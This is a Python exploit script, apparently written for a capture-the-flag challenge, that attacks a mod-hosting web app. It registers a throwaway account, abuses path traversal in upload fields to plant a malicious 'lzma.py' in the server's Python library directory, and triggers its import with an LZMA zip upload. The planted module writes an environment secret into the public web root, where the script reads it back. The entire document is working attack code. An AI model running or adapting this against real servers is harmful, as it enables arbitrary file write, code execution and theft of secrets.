import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE = pf.BASE
u = "u%d"%random.randint(10000,99999); pw="pass12345"
requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
tok = pf.login(u,pw)

def write_stdlib(tok, ver, code, filename, data):
    pid = pf.create_platform(tok, code, name="z")
    mid = pf.create_mod(tok, ver, title="z")
    bid = pf.create_build(tok, mid, pid)
    return pf.upload_zip(tok, mid, bid, {filename: data})

def trigger_lzma(tok):
    bio = io.BytesIO()
    with zipfile.ZipFile(bio,"w",zipfile.ZIP_LZMA) as zf:
        zf.writestr("data.txt", b"x")
    bio.seek(0)
    pid = pf.create_platform(tok, "lt%d"%random.randint(0,9999), name="z")
    mid = pf.create_mod(tok, "tr%d"%random.randint(0,9999), title="z")
    bid = pf.create_build(tok, mid, pid)
    return requests.post(f"{BASE}/api/mods/{mid}/builds/{bid}/upload/",
        headers={"Authorization":f"Bearer {tok}"}, files={"zip_file":("p.zip",bio,"application/zip")}, timeout=20)

mal = b'import os\nopen("/usr/share/nginx/html/rlmark.txt","w").write(os.environ.get("FLAG","NOFLAG"))\n'
# reach /usr/local/lib/python3.11: ver up to root + usr/local, code lib/python3.11
r = write_stdlib(tok, "../../../../usr/local", "lib/python3.11", "lzma.py", mal)
print("write /usr/local/lib/python3.11/lzma.py ->", r.status_code, r.text[:100])
r2 = trigger_lzma(tok)
print("trigger ->", r2.status_code, r2.text[:80])
time.sleep(2)
c = requests.get(f"{BASE}/rlmark.txt", timeout=8)
print("rlmark status:", c.status_code, "body:", repr(c.content[:120]))
